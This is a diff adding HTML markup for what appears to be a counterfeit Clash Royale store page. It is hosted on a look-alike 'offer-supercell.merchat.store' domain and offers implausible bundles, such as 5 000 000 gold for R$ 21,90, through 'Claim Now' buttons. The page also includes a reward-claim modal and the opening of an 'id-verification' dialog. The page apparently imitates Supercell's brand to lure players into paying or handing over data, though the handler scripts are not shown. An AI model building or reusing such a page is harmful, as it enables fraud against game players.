+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagLight__uNojb"></div>
+                           </div>
+                           <div class="PointsTag_Container__dzfcn">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagDark__DNdS5"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleDark__lZBrv PointsTag_Dark__0bud_">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/bonus-icon.svg);background-size:20px 20px;background-repeat:no-repeat;background-position:center;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Dark__0bud_" font="supercellTextBold">
+                                    +<!-- -->250<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Dark__0bud_ PointsTag_NoOutline__yNEAe"></div>
+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagDark__DNdS5"></div>
+                           </div>
+                        </div>
+                        <div class="Footer_BuyButtonArea__zux3t">
+                           <button onclick="claimNow(this)" data-name="Royale Starter Pack" data-img="images/card lendario.webp" class="Button_Button__Msu2a Button_Primary__anIDa BuyButton_StoreFrontBuyButton__Zykdy BuyButton_Dark__Ww3Wu" data-type="buy">
+                              <div class="BuyButton_ContentWrapper__pg5il" style="font-size:10px;color:white;font-family:clash">
+                                 <svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                 </svg>
+                                 R$ 21,90
+                              </div>
+                           </button>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferAvailability_AvailabilityContainer__V88vw ClashRoyaleOfferAvailability_green__Sbf5k ClashRoyaleOfferCard_Availability__aKQ6L"><span class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextMedium__2FL9v storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleOfferAvailability_AvailabilityText__w_CaH" font="supercellTextMedium" style="color:white">1/1 available</span></div>
+                  </div>
+               </a>
+            </div>
+
+              <div id="royal-pro-player-pack/21e1aac6" class="OfferCard_offerCardContainer__tXsBD">
+                 <a class="OfferCard_ContainerLink__wQvfj">
+                   <div class="ClashRoyaleContainer_Container__q1wLd colors_green__ZYwOQ ClashRoyaleOfferCard_Container__Wr1O_ ClashRoyaleOfferCard_withShadow__8lQpI ClashRoyaleContainer_MultiProductContainer__BnHWG">
+                     <div class="ClashRoyaleHeading_Container__8pX7c">
+                        <div class="ClashRoyaleHeading_RowContainer__h2tbZ ClashRoyaleHeading_MultiItemProduct__6XUmk">
+                           <span class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleHeading_Strikethrough__TTA8r" font="clashroyale"></span>
+                           <h3 class="" style="font-family:clash;font-size:18px">Royal Pro Player Pack</h3>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferCardContent_MultiItemContent__BTFv5">
+                        <div class="ClashRoyaleOfferCardContent_MultiItemGridContainer__NBGSp">
+                           <div class="ItemsGrid_Items__Jt7tU ClashRoyaleOfferCardContent_NormalGrid__8sPTR">
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Gold" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent" src="images/79055435-71c5-476d-96d0-c6d9b9537963.png"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale" style="font-size:11px;">5 000 000</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Gems" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent" src="images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">10 000</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Legendary Card" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent;transform:scale(1.5);transform-origin:center" src="images/card%20lendario.webp"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">500</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="Footer_Footer__LdRIC Footer_clashroyale__lQixY">
+                        <div class="Tags_TagsContainer__pP6Zc">
+                           <div class="PointsTag_Container__dzfcn PointsTag_Skew__8ELkb">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagLight__uNojb"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleLight__aVlPa PointsTag_Light__zuHDx">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/idr-tag.8b829739.png);background-size:24px 24px;background-repeat:no-repeat;background-position:0 -3px;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Light__zuHDx" font="supercellTextBold">
+                                    +<!-- -->500<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Light__zuHDx PointsTag_NoOutline__yNEAe"></div>
+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagLight__uNojb"></div>
+                           </div>
+                           <div class="PointsTag_Container__dzfcn">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagDark__DNdS5"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleDark__lZBrv PointsTag_Dark__0bud_">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/bonus-icon.svg);background-size:20px 20px;background-repeat:no-repeat;background-position:center;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Dark__0bud_" font="supercellTextBold">
+                                    +<!-- -->500<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Dark__0bud_ PointsTag_NoOutline__yNEAe"></div>
+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagDark__DNdS5"></div>
+                           </div>
+                        </div>
+                        <div class="Footer_BuyButtonArea__zux3t">
+                           <button onclick="claimNow(this)" data-name="Royal Pro Player Pack" data-img="images/card gemas.png" class="Button_Button__Msu2a Button_Primary__anIDa BuyButton_StoreFrontBuyButton__Zykdy BuyButton_Dark__Ww3Wu" data-type="buy">
+                              <div class="BuyButton_ContentWrapper__pg5il" style="font-size:10px;color:white;font-family:clash">
+                                 <svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                 </svg>
+                                 R$ 27,90
+                              </div>
+                           </button>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferAvailability_AvailabilityContainer__V88vw ClashRoyaleOfferAvailability_green__Sbf5k ClashRoyaleOfferCard_Availability__aKQ6L"><span class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextMedium__2FL9v storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleOfferAvailability_AvailabilityText__w_CaH" font="supercellTextMedium" style="color:white">1/1 available</span></div>
+                  </div>
+               </a>
+            </div>
+
+        <div id="royale-offer/4cabcaf1" class="OfferCard_offerCardContainer__tXsBD">
+   <a class="OfferCard_ContainerLink__wQvfj">
+      <div class="ClashRoyaleContainer_Container__q1wLd colors_dark__DJexM ClashRoyaleOfferCard_Container__Wr1O_ ClashRoyaleOfferCard_SpecialOfferContainer__TJLka ClashRoyaleOfferCard_withShadow__8lQpI ClashRoyaleContainer_SpecialOfferContainer__xHnmB" style="padding-bottom:10px;">
+         <div class="ClashRoyaleStoreSpecialHeading_SpecialOfferContainer__JTu7c">
+            <div class="ClashRoyaleStoreSpecialHeading_RowContainer___8tO0" style="text-align:center;">
+               <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-md__GQ9xx storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW" font="clashroyale" style="text-align:center;">Mega Oferta</h3>
+            </div>
+         </div>
+         <div class="ClashRoyaleOfferCardContent_MultiItemContent__BTFv5" style="padding-top:5px;">
+            <div class="ClashRoyaleStoreSpecialHero_RegularHero__1khzU undefined" style="margin-bottom:0;"><img alt="Hero image" width="343" height="184" src="images/card%20megaoferta.jpg"></div>
+            <div class="ClashRoyaleOfferCardContent_MultiItemGridContainer__NBGSp" style="margin-top:-40px;position:relative;z-index:2;">
+               <div class="ItemsGrid_Items__Jt7tU ClashRoyaleOfferCardContent_NormalGrid__8sPTR" style="display:flex;flex-wrap:wrap;justify-content:center;gap:8px;max-width:330px;margin:0 auto;padding-bottom:5px;">
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Video" data-type="webp" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent" src="images/969df409-b453-48fd-b77a-d29b18e881e9.webp"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">10 000</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Video" data-type="webp" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent" src="images/e29d94da-4e20-4110-b556-66441307bb7a.webp"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">5 000</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Video" data-type="webp" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent" src="images/af58cd20-9e33-4225-99b8-56f7188b2b22.webp"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">1 000</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Legendary Card" data-type="webp" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent;transform:scale(1.1);transform-origin:center" src="images/card%20lendario.webp"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">500</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Trophy Card" data-type="webp" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent;transform:scale(1.0);transform-origin:center" src="images/trofeu%20card.webp"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">100</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_" style="flex:0 0 calc(33.333% - 7px);max-width:100px;">
+                     <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                        <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Gems Card" data-type="png" loading="lazy" width="200" height="200" decoding="async" data-nimg="1" class="VideoAsset_Image__g5TQD" style="color:transparent;transform:scale(1.0);transform-origin:center" src="images/card%20gemas.png"></div>
+                        <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                           <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                              <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">10 000</h3>
+                           </span>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+         <div class="Footer_Footer__LdRIC Footer_clashroyale__lQixY Footer_variant__g1GJk">
+            <div class="Tags_TagsContainer__pP6Zc">
+               <div class="PointsTag_Container__dzfcn PointsTag_Skew__8ELkb">
+                  <div class="PointsTag_TagStart__XIUSS PointsTag_TagLight__uNojb"></div>
+                  <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleLight__aVlPa PointsTag_Light__zuHDx">
+                     <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(https://offer-supercell.merchat.store/_next/static/media/idr-tag.8b829739.png);background-size:24px 24px;background-repeat:no-repeat;background-position:0 -3px;z-index:2"></span>
+                     <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Light__zuHDx" font="supercellTextBold">
+                        +<!-- -->1 000<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                     </p>
+                     <div class="PointsTag_TagGlow__wjHhQ PointsTag_Light__zuHDx PointsTag_NoOutline__yNEAe"></div>
+                  </div>
+                  <div class="PointsTag_TagEnd__mDnYT PointsTag_TagLight__uNojb"></div>
+               </div>
+               <div class="PointsTag_Container__dzfcn">
+                  <div class="PointsTag_TagStart__XIUSS PointsTag_TagDark__DNdS5"></div>
+                  <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleDark__lZBrv PointsTag_Dark__0bud_">
+                     <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/bonus-icon.svg);background-size:20px 20px;background-repeat:no-repeat;background-position:center;z-index:2"></span>
+                     <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Dark__0bud_" font="supercellTextBold">
+                        +<!-- -->1 000<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                     </p>
+                     <div class="PointsTag_TagGlow__wjHhQ PointsTag_Dark__0bud_ PointsTag_NoOutline__yNEAe"></div>
+                  </div>
+                  <div class="PointsTag_TagEnd__mDnYT PointsTag_TagDark__DNdS5"></div>
+               </div>
+            </div>
+            <div class="Footer_BuyButtonArea__zux3t">
+               <button onclick="claimNow(this)" data-name="Mega Oferta" data-img="images/card megaoferta.jpg" class="Button_Button__Msu2a Button_Primary__anIDa BuyButton_StoreFrontBuyButton__Zykdy BuyButton_Light__yoKPW" data-type="buy">
+                  <div class="BuyButton_ContentWrapper__pg5il" style="font-family:clash;font-size:12px">
+                     <svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC BuyButton_DarkIcon__wl4KO" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                     </svg>
+                     R$ 34,90
+                  </div>
+               </button>
+            </div>
+         </div>
+         <div class="ClashRoyaleOfferAvailability_AvailabilityContainer__V88vw ClashRoyaleOfferAvailability_dark__YLHQJ ClashRoyaleOfferCard_Availability__aKQ6L"><span class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextMedium__2FL9v storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleOfferAvailability_AvailabilityText__w_CaH" font="supercellTextMedium" style="color:white">1/1 available</span></div>
+      </div>
+   </a>
+</div>
+
+         </div>
+      </div>
+
+   </div>
+</div>
+
+<!-- Skill -->
+
+
+
+<!-- modal -->
+<div data-state="open" class="Modal_modalOverlay__7MjuS" style="pointer-events: auto;display:none">
+   <div class="Modal_modalScroller___kn4r">
+      <div class="Modal_spacerTop___Y7mo" data-aria-hidden="true" aria-hidden="true"></div>
+      <div role="dialog" id="radix-:r1b:" aria-describedby="radix-:r1d:" aria-labelledby="radix-:r1c:" data-state="open" class="Modal_modalContent__8WDJT" data-sentry-element="ModalContent" data-sentry-source-file="RewardClaimModal.tsx" tabindex="-1" style="pointer-events: auto;">
+         <button type="button" onclick="closeReward()" class="modalCloseBtn" aria-label="Close" data-sentry-element="ModalClose" data-sentry-source-file="RewardClaimModal.tsx">
+            <svg class="" width="40" height="40" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 42" fill="none" data-sentry-element="svg" data-sentry-source-file="Close.tsx" data-sentry-component="Close">
+               <g filter="url(#filter0_di_75_21542)" data-sentry-element="g" data-sentry-source-file="Close.tsx">
+                  <path d="M0 20C0 8.95431 8.95431 0 20 0C31.0457 0 40 8.95431 40 20C40 31.0457 31.0457 40 20 40C8.95431 40 0 31.0457 0 20Z" fill="#1A1A1A" data-sentry-element="path" data-sentry-source-file="Close.tsx"></path>
+                  <path fill-rule="evenodd" clip-rule="evenodd" d="M29.6529 11.7613C30.0434 11.3708 30.0434 10.7376 29.6529 10.3471C29.2624 9.95657 28.6292 9.95657 28.2387 10.3471L20 18.5857L11.7614 10.3471C11.3709 9.95658 10.7377 9.95659 10.3472 10.3471C9.95669 10.7376 9.95669 11.3708 10.3472 11.7613L18.5858 19.9999L10.3472 28.2385C9.95669 28.6291 9.95669 29.2622 10.3472 29.6528C10.7377 30.0433 11.3709 30.0433 11.7614 29.6528L20 21.4141L28.2387 29.6528C28.6292 30.0433 29.2624 30.0433 29.6529 29.6528C30.0434 29.2623 30.0434 28.6291 29.6529 28.2386L21.4143 19.9999L29.6529 11.7613Z" fill="#F2F2F2" data-sentry-element="path" data-sentry-source-file="Close.tsx"></path>
+               </g>
+               <defs data-sentry-element="defs" data-sentry-source-file="Close.tsx">
+                  <filter id="filter0_di_75_21542" x="0" y="0" width="40" height="42" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB" data-sentry-element="filter" data-sentry-source-file="Close.tsx">
+                     <feFlood flood-opacity="0" result="BackgroundImageFix" data-sentry-element="feFlood" data-sentry-source-file="Close.tsx"></feFlood>
+                     <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" data-sentry-element="feColorMatrix" data-sentry-source-file="Close.tsx"></feColorMatrix>
+                     <feOffset dy="2" data-sentry-element="feOffset" data-sentry-source-file="Close.tsx"></feOffset>
+                     <feComposite in2="hardAlpha" operator="out" data-sentry-element="feComposite" data-sentry-source-file="Close.tsx"></feComposite>
+                     <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0" data-sentry-element="feColorMatrix" data-sentry-source-file="Close.tsx"></feColorMatrix>
+                     <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_75_21542" data-sentry-element="feBlend" data-sentry-source-file="Close.tsx"></feBlend>
+                     <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_75_21542" result="shape" data-sentry-element="feBlend" data-sentry-source-file="Close.tsx"></feBlend>
+                     <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" data-sentry-element="feColorMatrix" data-sentry-source-file="Close.tsx"></feColorMatrix>
+                     <feOffset dy="2.5" data-sentry-element="feOffset" data-sentry-source-file="Close.tsx"></feOffset>
+                     <feComposite in2="hardAlpha" operator="arithmetic" k2="-1" k3="1" data-sentry-element="feComposite" data-sentry-source-file="Close.tsx"></feComposite>
+                     <feColorMatrix type="matrix" values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.3 0" data-sentry-element="feColorMatrix" data-sentry-source-file="Close.tsx"></feColorMatrix>
+                     <feBlend mode="normal" in2="shape" result="effect2_innerShadow_75_21542" data-sentry-element="feBlend" data-sentry-source-file="Close.tsx"></feBlend>
+                  </filter>
+               </defs>
+            </svg>
+         </button>
+         <div class="RewardClaimModal_rewardClaim__gvgPr" data-game="clashofclans" data-variant="false">
+            <div class="RewardClaimModal_rewardClaim__hero__7tTuT">
+               <div class="Flare_flare__G8w81">
+                  <div class="Flare_flare__image__7IgPE Flare_clashofclans___kHVn" style="background-image: url('images/flare.webp');"></div>
+               </div>
+               
+               <img src="https://offer-supercell.merchat.store/img/1.webp" style="border-radius:10px" id="claimImg" alt="Reward hero image" class="RewardClaimModal_rewardClaim__image__8ZThf">
+            </div>
+            <div class="RewardClaimContent_rewardClaimContent__z5WfA" data-sentry-component="RewardClaimContent" data-sentry-source-file="RewardClaimContent.tsx">
+               <div class="RewardClaimContent_rewardClaimContent__container__dg6DW" style="display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:180px;padding:30px 20px;">
+                  <div class="RewardClaimContent_rewardClaimContent__progressContainer__y6_C5" id="claimTitleContainer" style="margin-bottom:20px;">
+                     <h4 style="font-size: 14px;" class="Typography_reset__OAp2D Typography_typography__uqjku Typography_heading__tx23J Typography_font-supercellText__K7lXp Typography_size-m__j3HEs Typography_style-plain__QCprV Typography_weight-bold__IgTi0 RewardClaimContent_rewardClaimContent__heading__zNW0F" data-sentry-element="Heading" data-sentry-source-file="RewardClaimContent.tsx">Claim <span id="claimLabel">Resource Potion</span>?</h4>
+                  </div>
+                   <div id="itemsList" style="display:none;margin:20px 0;padding:0;flex:1;display:flex;align-items:center;">
+                      <div id="itemsContainer" style="display:grid;grid-template-columns:repeat(2, 1fr);gap:10px 20px;max-width:280px;margin:0 auto;"></div>
+                   </div>
+                  <div class="RewardClaimContent_rewardClaimContent__buttonsContainer__bJHKl" style="margin-top:20px;">
+                     <button onclick="goClaim()" class="Button_Button__Msu2a Button_Primary__anIDa BuyButton_StoreFrontBuyButton__Zykdy BuyButton_Dark__Ww3Wu" data-type="buy" style="height:48px;">
+                            <div class="BuyButton_ContentWrapper__pg5il" style="color:white;font-family: clash;">
+                                <svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                </svg>
+                                Claim Now
+                            </div>
+                        </button>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div class="Modal_spacerBottom__u1qbS" data-aria-hidden="true" aria-hidden="true"></div>
+   </div>
+</div>
+
+<!-- modal -->
+
+<div id="id-verification" class="storefrontModal_Modal__rdA_q storefrontModal_Middle__udpjF storefrontModal_creatorCodeModal__zBAMl" dir="ltr">
+   <div class="storefrontModal_ModalContent__GFahI">
